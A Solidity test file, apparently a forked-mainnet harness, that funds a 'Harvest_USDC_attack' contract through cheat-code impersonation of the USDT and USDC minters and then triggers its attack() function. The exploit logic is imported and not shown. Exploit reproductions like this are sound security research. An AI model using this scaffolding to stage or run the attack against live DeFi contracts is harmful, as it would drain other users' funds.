// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.7.0;

import "ds-test/test.sol";
import "../attack.sol";
import "../stdlib.sol";
import "../Vm.sol";
import "../CheatCodes.sol";


contract attackTester is DSTest, stdCheats {
    Harvest_USDC_attack attackContract;
    Vm public constant vm = Vm(HEVM_ADDRESS);
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);

    constructor() {
        attackContract = new Harvest_USDC_attack();
        IUSDT USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        startHoax(address(0xC6CDE7C39eB2f0F0095F41570af89eFC2C1Ea828));
        USDT.issue(50000000 * 10 ** 6 );
        USDT.transfer(address(attackContract), 50000000 * 10 ** 6);
        cheats.stopPrank();
        startHoax(address(0x55FE002aefF02F77364de339a1292923A15844B8));
        IUSDC USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        address MasterMinter = USDC.masterMinter();
        cheats.stopPrank();
        startHoax(MasterMinter);
        USDC.configureMinter(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 2**256 -1);
        cheats.stopPrank();
        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58));
        USDC.mint(address(attackContract), 20000000e6);
    }

    
    function testExample0_() public {
      attackContract.attack();
    }

}